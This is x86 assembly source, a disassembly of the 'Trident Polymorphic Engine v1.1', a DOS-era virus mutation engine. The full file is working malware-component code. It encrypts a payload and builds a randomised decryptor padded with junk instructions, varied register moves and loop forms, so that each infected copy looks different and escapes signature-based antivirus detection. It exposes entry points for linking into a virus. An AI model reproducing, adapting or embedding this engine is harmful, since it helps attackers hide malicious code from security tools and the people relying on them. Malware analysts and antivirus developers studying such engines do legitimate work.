.radix 16

;=============================================================================
;                                                                            =
;                       Trident Polymorphic Engine v1.1                      =
;                       -------------------------------                      =
;                                                                            =
;               Dissassembled by: Lucifer Messiah -- ANARKICK SYSTEMS        =
;                                                                            =
;               This dissassembly uses as many of the labels from the        =
;               TPE v1.2 dissassembly as possible, to allow comparison       =
;                                                                            =
;----------------------------------------------------------------------------=
;                                                                            =
;       Trident Polymorphic Engine v1.1                                      =
;       -------------------------------                                      =
;                                                                            =
;       Input:                                                               =
;             ES      Work Segment                                           =
;             DS:DX   Code to be encrypted                                   =
;             BP      Becomes offset of TPE                                  =
;             SI      Distance to put between decryptor and code             =
;             CX      Length of code to encrypt                              =
;             AX      Bit Field Flags:  bit 0: DS will not be equal to CS    =
;                                       bit 1: insert random instructions    =
;                                       bit 2: put junk before decryptor     =
;                                       bit 3: Preserve AX with decryptor    =
;                                                                            =
;       Output:                                                              =
;             ES      Work Segment (preserved)                               =
;             DS:DX   Decryptor + encrypted code                             =
;             BP      Start of decryptor (preserved)                         =
;             DI      Length of decryptor/offset of encrypted code           =
;             CX      Length of decryptor + encrypted code                   =
;             AX      Length of encrypted code                               =
;                                                                            =
;=============================================================================

               .model tiny
               .code
                org  0

public          rnd_init
public          rnd_get
public          crypt
public          tpe_top
public          tpe_bottom

tpe_top         equ     $
                db      '[ MK / TridenT ]'      ;encryptor name

crypt:
                xor     di,di
                call    dword ptr ds:[5652h]    ;????
                push    cs                      ;save registers
                pop     ds
                mov     byte ptr flags,al
                test    al,8
                je      no_push
                mov     al,50h
                stosb

no_push:
                call    rnd_get                 ;add a few bytes to cx
                and     ax,1fh
                add     cx,ax
                push    cx                      ;save length of code
                call    rnd_get                 ;get random flags
                xchg    ax,bx

;--- Flags: -----------------------------------------------
;
; 0,1   encryption method
; 2,3   which registers to use in encryption engine
; 4     use byte or word for encrypt
; 5     MOV AL, MOV AH, or MOV AX
; 6     MOV CL, MOV CH, or MOV CX
; 7     AX or DX
; 8     count up or down
; 9     ADD/SUB/INC/DEC or CMPSW/SCASW
; A     ADD/SUB or INC/DEC
;       CMPSW or SCASW
; B     offset in XOR instrucion?
; C     LOOPNZ or LOOP
;       SUB CX or DEC CX
; D     carry with crypt ADD/SUB
; E     carry with inc ADD/SUB
; F     XOR instruction value or AX/DX
;
;----------------------------------------------------------

random:
                call    rnd_get                 ;get encryption value
                or      al,al                   ;is it a 0?
                je      random                  ;redo it if it is
                mov     word ptr xor_val,ax     ;store non-zero encryptor
                call    do_junk                 ;insert random instructions
                pop     cx
                mov     ax,0111h                ;make flags to remember which
                test    bl,20h                  ; MOV instructions are used
                jne     z0
                xor     al,07

z0:
                test    bl,0ch
                jne     z1
                xor     al,70h

z1:
                test    bl,40h
                jne     z2
                xor     ah,7

z2:
                test    bl,10h
                jne     z3
                and     al,73h

z3:
                test    bh,80h
                jne     z4
                and     al,70h

z4:
                mov     dx,ax

mov_lup:
                call    rnd_get                 ;put MOV instrucions in a
                and     ax,0fh                  ; random order
                cmp     al,0ah
                ja      mov_lup
                mov     si,ax                   ;
                push    cx                      ;test if MOV already done
                xchg    ax,cx
                mov     ax,1
                shl     ax,cl
                mov     cx,ax
                and     cx,dx
                pop     cx
                je      mov_lup
                xor     dx,ax                   ;remember which MOV done
                push    dx
                call    do_mov
                call    do_nop                  ;insert a random NOP
                pop     dx
                or      dx,dx                   ;all MOVs done?
                jne     mov_lup
                push    di                      ;save start of decryptor loop
                call    do_add_ax               ;ADD AX for loop
                call    do_nop
                test    bh,20h                  ;carry with ADD/SUB?
                je      no_clc
                mov     al,0f8h
                stosb

no_clc:
                mov     word ptr xor_offset,0
                call    do_xor                  ;place all loop instructions
                call    do_nop
                call    do_add
                pop     dx                      ;get start of decryptor loop
                call    do_loop
                test    byte ptr store_mov,8    ;insert POP AX?
                je      no_pop
                mov     al,58h
                stosb

no_pop:
                xor     ax,ax
                test    bh,01
                je      no_pop2
                mov     ax,cx
                dec     ax
                test    bl,10h
                je      no_pop2
                and     al,0feh

no_pop2:
                add     ax,di                   ;calculate loop offset
                add     ax,bp
                pop     si
                add     ax,si
                sub     ax,word ptr xor_offset
                mov     si,word ptr where_len
                test    bl,0ch               ;are BL,BH used for encryption?
                jne     v2
                mov     byte ptr es:[si],al
                mov     si,word ptr where_len2
                mov     byte ptr es:[si],ah
                jmp     short v3

v2:
                mov     word ptr es:[si],ax

v3:
                mov     dx,word ptr xor_val
                pop     si                      ;ds:si=start of code
                pop     ds
                push    di                      ;save pointer to start of code
                push    cx                      ; and length of encrypted code
                test    bl,10h                  ;byte or word?
                je      blup
                inc     cx                      ;cx=# of crypts (words)
                shr     cx,1

lup:
                lodsw                           ;encrypt code (words)
                call    do_encrypt
                stosw
                loop    lup
                jmp     short klaar

blup:
                lodsb                           ;encrypt code (bytes)
                xor     dh,dh
                call    do_encrypt
                stosb
                loop    blup

klaar:
                mov     cx,di                   ;cx=lenth decryptor + code
                pop     ax                      ;ax=length of decrypted code
                pop     di                      ;offset encrypted code
                xor     dx,dx                   ;ds:dx=decryptor + cr code
                push    es
                pop     ds
                retn

;--- Encrypt the Code -------------------------------------
 
do_encrypt:
                add     dx,word ptr cs:add_val
                test    bl,02
                jne     lup1
                xor     ax,dx
                retn

lup1:
                test    bl,01
                jne     lup2
                sub     ax,dx
                retn

lup2:
                add     ax,dx
                retn

;--- Generate MOV reg,xxxx --------------------------------
 
do_mov:
                mov     dx,si
                mov     al,byte ptr ds:mov_byte[si]
                cmp     dl,04                           ;bx?
                jne     is_not_bx
                call    add_ind

is_not_bx:
                test    dl,0ch                          ;a*?
                pushf
                jne     is_not_a
                test    bl,80h                          ;a* or d*?
                je      is_not_a
                add     al,02

is_not_a:
                call    alter                           ;insert the MOV A*
                popf
                jne     is_not_a2
                mov     ax,word ptr ds:xor_val
                jmp     short sss

is_not_a2:
                test    dl,08                           ;b*?
                jne     is_not_b
                mov     si,offset where_len
                test    dl,2
                je      is_not_bh
                add     si,2

is_not_bh:
                mov     word ptr [si],di
                jmp     short sss

is_not_b:
                mov     ax,cx                   ;c*?
                test    bl,10h                  ;byte or word encrypt?
                je      sss
                inc     ax                      ;only 1/2 the number of bytes
                shr     ax,1

sss:
                test    dl,3                   ;byte or word register?
                je      is_x
                test    dl,2                    ;*h?
                je      is_not_h
                xchg    ah,al

is_not_h:
                stosb
                retn

is_x:
                stosw
                retn

;--- Insert MOV or alternative for MOV --------------------
 
alter:
                push    bx
                push    cx
                push    ax
                call    rnd_get
                xchg    ax,bx
                pop     ax
                test    bl,3                    ;use alternative for MOV?
                je      no_alter
                push    ax
                and     bx,0fh
                and     al,8
                shl     ax,1
                or      bx,ax
                pop     ax
                and     al,7
                mov     cl,9
                xchg    ax,cx
                mul     cl
                add     ax,30c0h
                xchg    ah,al
                test    bl,4
                je      no_sub
                mov     al,28h

no_sub:
                call    maybe_2
                stosw
                mov     al,80h
                call    maybe_2
                stosb
                lea     ax,word ptr alt_code
                xchg    ax,bx
                and     ax,3
                xlat
                add     al,cl

no_alter:
                stosb
                pop     cx
                pop     bx
                retn

;--- Insert ADD AX,xxxx -----------------------------------

do_add_ax:
                push    cx
                lea     si,add_val
                mov     word ptr [si],0         ;save ADD val
                mov     ax,bx
                and     ax,8110h
                xor     ax,8010h
                jne     no_add_ax               ;use ADD?
                mov     ax,bx
                xor     ah,ah
                mov     cl,3
                div     cl
                or      ah,ah
                jne     no_add_ax               ;use ADD?
                test    bl,80h
                jne     do_81C2                 ;AX or DX?
                mov     al,5
                stosb
                jmp     short do_add0

do_81C2:
                mov     ax,0c281h
                stosw

do_add0:
                call    rnd_get
                mov     word ptr [si],ax
                stosw

no_add_ax:
                pop     cx
                retn

;--- generate encryption command --------------------------
 
do_xor:
                test    byte ptr ds:flags,1
                je      no_cs
                mov     al,2eh                  ;insert CS: instruction
                stosb

no_cs:
                test    bh,80h                  ;type of XOR command
                je      xor1
                call    get_xor
                call    do_carry
                call    save_it
                xor     ax,ax
                test    bl,80h
                je      xxxx
                add     al,10h
 
xxxx:
                call    add_dir
                test    bh,8
                jne     yyyy
                stosb
                retn

yyyy:
                or      al,80h
                stosb
                call    rnd_get
                stosw
                mov     word ptr ds:xor_offset,ax
                retn

xor1:
                mov     al,80h                  ;encrypt with value
                call    save_it
                call    get_xor
                call    do_carry
                call    xxxx
                mov     ax,word ptr ds:xor_val
                test    bl,10h
                jmp     byte_word

;--- generate increase/decrease command -------------------
 
do_add:
                test    bl,8            ;no CMPSW/SCASW if BX is used
                je      da0
                test    bh,2            ;ADD/SUB/INC/DEC or CMPSW/SCASW
                jne     do_cmpsw

da0:
                test    bh,4            ;ADD/SUB or INC/DEC?
                je      add1
                mov     al,40h          ;INC/DEC
                test    bh,01
                je      add0
                add     al,8

add0:
                call    add_ind
                stosb
                test    bl,10h
                je      return
                stosb

return:
                retn

add1:
                test    bh,40h                  ;ADD/SUB
                je      no_clc2                 ;carry?
                mov     al,0f8h                 ;insert CLC
                stosb

no_clc2:
                mov     al,83h
                stosb
                mov     al,0c0h
                test    bh,01
                je      b0627f
                mov     al,0e8h                 ;insert XXX

b0627f:
                test    bh,40h
                je      add2
                and     al,0cfh
                or      al,10h

add2:
                call    add_ind
                stosb
                mov     al,01
 
save_it:
                call    add_1
                stosb
                retn

b06293:
                test    bh,01
                je      do_cmpsw
                mov     al,0fdh                 ;add XXX
                stosb

do_cmpsw:
                test    bh,4                    ;CMPSE or SCASW?
                je      normal_cmpsw
                test    bl,4                    ;no SCASW if SI is used
                jne     do_scasw

normal_cmpsw:
                mov     al,0a6h
                jmp     short save_it

do_scasw:
                mov     al,0aeh
                jmp     short save_it

;--- generate LOOP command --------------------------------
 
do_loop:
                test    bh,01                   ;no JNE if counting down
                jne     do_loop2
                call    rnd_get
                test    al,01
                jne     cx_loop

do_loop2:
                mov     al,0e0h                 ;LOOPNZ or LOOP?
                test    bh,1ah                  ; no LOOPNZ if xor-offset
                je      l10                     ; no LOOPNZ if CMP/SCASW
                add     al,2

l10:
                stosb
                mov     ax,dx
                sub     ax,di
                dec     ax
                stosb
                retn

cx_loop:
                test    bh,10h                  ;SUB CX or DEC CX?
                jne     cx1_dec
                mov     ax,0e983h
                stosw
                mov     al,1
                stosb
                jmp     short do_jne

cx1_dec:
                mov     al,49h
                stosb

do_jne:
                mov     al,75h
                jmp     short l10

;--- add value to AL depending on register type -----------
 
add_dir:
                lea     si,word ptr dir_change
                jmp     short xx1

add_ind:
                lea     si,word ptr ind_change

xx1:
                push    bx
                shr     bl,1
                shr     bl,1
                and     bx,3
                add     al,byte ptr [bx+si]
                pop     bx
                retn

;--- move encyryption command byte to AL ------------------
 
get_xor:
                push    bx
                lea     ax,word ptr how_mode
                xchg    ax,bx
                and     ax,3
                xlat
                pop     bx
                retn

;--- change ADD to ADC ------------------------------------
 
do_carry:
                test    bl,2            ;ADD/SUB used for encryption
                je      no_ac
                test    bh,20h
                je      no_ac
                and     al,0cfh
                or      al,10h

no_ac:
                retn

;--- change AL (byte/word) --------------------------------
 
add_1:
                test    bl,10h
                je      add_1_ret
                inc     al

add_1_ret:
                retn

;--- change AL (byte/word) --------------------------------
 
maybe_2:
                call    add_1           ;can't touch this...
                cmp     al,81h
                je      maybe_not
                push    ax
                call    rnd_get
                test    al,1
                pop     ax
                je      maybe_not
                add     al,2

maybe_not:
                retn

;--- insert random instructions ---------------------------
 
do_nop:
                test    byte ptr ds: flags,2

yes_nop:
                je      no_nop
                call    rnd_get
                test    al,3
                je      nop8
                test    al,2
                je      nop16

b0633b          equ     $+01h
                test    al,1
                je      nop16x

no_nop:
                retn

;--- insert random nop (or not) ---------------------------
 
do_junk:
                test    byte ptr ds:flags,4
                je      no_junk
                call    rnd_get         ;put a random number of
                and     ax,0fh          ; dummy instructions before
                inc     ax              ; decryptor
                xchg    ax,cx

junk_loop:
                call    junk
                loop    junk_loop

no_junk:
                retn
 
junk:
                call    rnd_get
                and     ax,01eh
                jmp     short aa0

nop16x:
                call    rnd_get
                and     ax,6

aa0:
                xchg    ax,si
                call    rnd_get
                jmp     word ptr ds:junk_cals[si]


;-----------------------------------------------------

junk_cals:
                dw      offset nop16x0
                dw      offset nop16x1
                dw      offset nop16x2
                dw      offset nop16x3
                dw      offset nop8
                dw      offset nop16
                dw      offset junk6
                dw      offset junk7
                dw      offset junk8
                dw      offset junk9
                dw      offset junkA
                dw      offset junkB
                dw      offset junkC
                dw      offset junkD
                dw      offset junkE
                dw      offset junkF

;-----------------------------------------------------

nop16x0:
                add     byte ptr [si],cl        ;J* 0000 (conditional)
                jo      yes_nop                 ;jump on overflow
                retn

nop16x1:
                mov     al,0ebh                 ;JMP xxxx/junk
                and     ah,7
                inc     ah
                stosw
                xchg    ah,al                   ;get length of bullshit
                cbw                             ;convert AL to AX
                jmp     fill_bullshit

nop16x2:
                call    junkD                   ;XCHG AX,reg/XCHG AX,reg
                stosb
                retn

nop16x3:
                call    junkF                   ;INC/DEC or DEC/INC
                xor     al,8
                stosb
                retn

nop8:
                push    bx
                and     al,7
                lea     bx,word ptr nop_data8
                xlat
                stosb
                pop     bx
                retn

nop16:
                push    bx
                and     ax,0303h
                lea     bx,word ptr nop_data16
                xlat
                add     al,ah
                stosb
                call    rnd_get
                and     al,7
                mov     bl,9
                mul     bl
                add     al,0c0h
                stosb
                pop     bx
                retn

junk6:
                push    cx
                mov     al,0e8h
                and     ah,0fh          ;CALL xxxx/junk/POP reg
                inc     ah
                stosw
                xor     al,al
                stosb
                xchg    ah,al
                call    fill_bullshit
                call    do_nop
                call    rnd_get         ;insert POP reg
                and     al,7
                call    no_sp
                mov     cx,ax
                or      al,58h
                stosb
                test    ch,3            ;more?
                jne     junk6_ret
                call    do_nop
                mov     ax,0f087h       ;insert XCHG SI,reg
                or      ah,cl
                test    ch,8
                je      j6_1
                mov     al,8bh

j6_1:
                stosw
                call    do_nop
                push    bx
                call    rnd_get
                xchg    ax,bx
                and     bx,0f7fbh       ;insert XOR [SI],xxxx
                or      bl,8
                call    do_xor
                pop     bx

junk6_ret:
                pop     cx
                retn

junk7:
                and     al,0fh          ;MOV reg,xxxx
                or      al,0b0h
                call    no_sp
                stosb
                test    al,8
                pushf
                call    rnd_get
                popf
                jmp     short byte_word

junk8:
                and     ah,39h          ;DO r/m,r(8,16)
                or      al,0c0h
                call    no_sp
                xchg    ah,al
                stosw
                retn

junk9:
                and     al,3bh          ;DO r(8,16),r/m
                or      al,2
                and     ah,3fh
                call    no_sp2
                call    no_bp
                stosw
                retn

junkA:
                and     ah,1            ;DO rm,xxxx
                or      ax,80c0h
                call    no_sp
                xchg    ah,al
                stosw
                test    al,1
                pushf
                call    rnd_get
                popf
                jmp     short byte_word

junkB:
                call    nop8              ;NOP/LOOP
                mov     ax,0fde2h
                stosw
                retn

junkC:
                and     al,9            ;CMPS* or SCAS*
                test    ah,1
                je      mov_test
                or      al,0a6h
                stosb
                retn

mov_test:
                or      al,0a0h         ;MOV AX,[xxxx] or TEST AX,xxxx
                stosb
                cmp     al,0a8h
                pushf
                call    rnd_get
                popf
                jmp     short byte_word

junkD:
                and     al,7            ;XCHG AX,reg
                or      al,90h
                call    no_sp
                stosb
                retn

junkE:
                and     ah,7
                or      ah,50h
                mov     al,ah
                or      ah,8
                stosw
                retn
 
junkF:
                and     al,0fh          ;INC/DEC
                or      al,40h
                call    no_sp
                stosb
                retn

;--- store a byte or a word -------------------------------

byte_word:
                je      only_byte
                stosw
                retn

only_byte:
                stosb
                retn

;--- don't fuck with sp -----------------------------------
 
no_sp:
                push    ax
                and     al,7
                cmp     al,4
                pop     ax
                jne     no_sp_ret
                and     al,0fbh

no_sp_ret:
                retn

;--- don't fuck with sp -----------------------------------
 
no_sp2:
                push    ax
                and     ah,38h
                cmp     ah,20h
                pop     ax
                jne     no_sp2_ret
                xor     ah,20h

no_sp2_ret:
                retn

;--- don't use [bp + ..] ----------------------------------
 
no_bp:
                test    ah,4
                jne     no_bp2
                and     ah,0fdh
                retn

no_bp2:
                push    ax
                and     ah,7
                cmp     ah,6
                pop     ax
                jne     no_bp_ret
                or      ah,1

no_bp_ret:
                retn

;--- write byte for JMP/CAL and fill with random bullshit -
 
fill_bullshit:
                push    cx
                xchg    ax,cx

bull_lup:
                call    rnd_get
                stosb
                loop    bull_lup
                pop     cx
                retn

;--- random number generator ------------------------------

rnd_init:
                push    ax
                push    cx
                call    random_init0
                and     ax,0h
                inc     ax
                xchg    ax,cx

random_lup:
                call    rnd_get         ;cal random routine a few
                loop    random_lup      ; times to 'warm up'
                pop     cx
                pop     ax
                retn
 
random_init0:
                push    dx              ;initialize generator
                push    cx
                mov     ah,2ch
                int     21h             ;get time CH,CL:DH,DL
                in      al,40h          ;timer
                mov     ah,al
                in      al,40h          ;timer
                xor     ax,cx
                xor     dx,ax
                jmp     short mov_rnd
 
rnd_get:
                push    dx              ;calculate random number
                push    cx
                push    bx
                in      al,40h

d06502          equ     $+01h
                add     ax,0000h

d06505          equ     $+01h
                mov     dx,0000h
                mov     cx,0007h

rnd_lup:
                shl     ax,1
                rcl     dx,1
                mov     bl,al
                xor     bl,dh
                jns     rnd_12
                inc     al

rnd_12:
                loop    rnd_lup
                pop     bx

mov_rnd:
                mov     word ptr cs:d06502,ax
                mov     word ptr cs:d06505,dx
                mov     al,dl
                pop     cx
                pop     dx
                retn

;-----------------------------------------------------
;.data

mov_byte        db      0b8,0b0,0b4,00          ;AX,AL,AH,..
                db      0b8,0b3,0b7,00          ;BX,GL,GH,..
                db      0b9,0b1,0b5             ;CX,CL,CH

nop_data8       db      90,0f8,0f9,0f5          ;NOP,CLC,STC,CMC
                db      0fa,0fc,45,4dh          ;CLI,CLD,INC BP,DEC BP

nop_data16      db      08,20,84,88             ;OR,AND,XCHG,MOV

dir_change      db      07,07,04,05             ;BL/BH,BX,SI,DI

ind_change      db      03,03,06,07             ;BL/BH,BX,SI,DI

how_mode        db      30,30,00,28             ;XOR,XOR,ADD,SUB

alt_code        dw      0c800h,0c0f0h           ;ADD AL,CL,????

add_val         dw      0
xor_val         dw      0
xor_offset      dw      0
where_len       dw      0
where_len2      dw      0
store_mov       db      0
flags           db      0

                db      '[TPE 1.1]'

tpe_bottom      equ     $
 
                end     tpe_top
 
